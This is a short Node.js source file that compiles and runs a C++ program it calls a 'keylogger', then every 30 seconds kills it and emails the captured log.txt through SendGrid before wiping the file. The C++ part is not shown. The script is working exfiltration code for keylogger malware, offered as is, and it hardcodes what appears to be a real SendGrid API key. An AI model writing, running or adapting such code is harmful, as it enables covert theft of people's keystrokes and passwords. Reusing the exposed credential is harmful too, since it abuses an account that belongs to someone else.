const fs = require('fs');
const sgMail = require('@sendgrid/mail');
const { exec } = require('child_process');
const { error } = require('console');
const { stderr, stdout, stdin } = require('process');

const filePath ="./test.cpp";
const execPath = 'test';
const compile = `g++ ${filePath} -o ${execPath}`;
const exectimeout = 30000;

const sgAPIKEY = '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';
sgMail.setApiKey(sgAPIKEY);

function mail() {
    data = fs.readFileSync('./log.txt','utf-8');
    const mail = {
        to : 'yourRecieverMail@example.com',
        from : 'yourSenderMail@example.com',
        subject : 'subject',
        text : data
    };
    sgMail.send(mail).then(resp => {
        console.log("success");
    }).catch(err => {
        console.log(err.message);
    });
    fs.writeFileSync('./log.txt'," ");
}

const runner = exec(compile,(error,stderr,stdout) => {
    if(error) {
        console.log(error.message);
        return ;
    }
    if(stderr) {
        console.log(stderr);
        return ;
    }

    exec(execPath,(error,stderr,stdout) => {
        if(error) {
            console.log(error.message);
            return ;
        }
        if(stderr) {
            console.log(stderr);
            return ;
        }

        console.log(stdout);
    });
});

const timer = setInterval(() => {
    console.error("Restarting keylogger");
    runner.kill();
    mail();
},exectimeout);
